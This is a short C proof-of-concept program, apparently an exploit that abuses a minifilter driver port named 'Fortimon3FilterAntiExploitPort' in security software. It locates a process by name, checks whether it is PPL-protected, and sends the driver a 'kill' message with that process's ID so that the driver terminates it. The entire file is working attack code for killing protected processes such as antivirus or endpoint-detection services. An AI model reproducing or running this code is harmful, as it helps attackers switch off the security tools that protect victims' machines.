#include <windows.h>
#include <fltuser.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "fltlib.lib")
#pragma comment(lib, "advapi32.lib")

typedef struct { DWORD magic; DWORD pid; } KILL_MSG;

DWORD FindPid(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("poc_kill.exe proses name\n");
        return 1;
    }

    DWORD pid = FindPid(argv[1]);
    if (!pid) {
        printf("%s not found\n", argv[1]);
        return 1;
    }
    printf("%s pid: %u\n", argv[1], pid);

    HANDLE hTest = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hTest) {
        printf("OpenProcess succeeded, amma not ppl-protected\n");
        CloseHandle(hTest);
    } else {
        printf("ppl-protected (error %u)\n", GetLastError());
    }

    HANDLE port;
    HRESULT hr = FilterConnectCommunicationPort(
        L"\\Fortimon3FilterAntiExploitPort", 0, NULL, 0, NULL, &port);
    if (FAILED(hr)) {
        printf("connect failed 0x%08X\n", hr);
        return 1;
    }

    KILL_MSG msg = { 0x6C6C696B, pid };
    DWORD br = 0;
    printf("killing %s (pid %u)...\n", argv[1], pid);
    FilterSendMessage(port, &msg, sizeof(msg), NULL, 0, &br);
    printf("meow\n");

    CloseHandle(port);
    return 0;
}
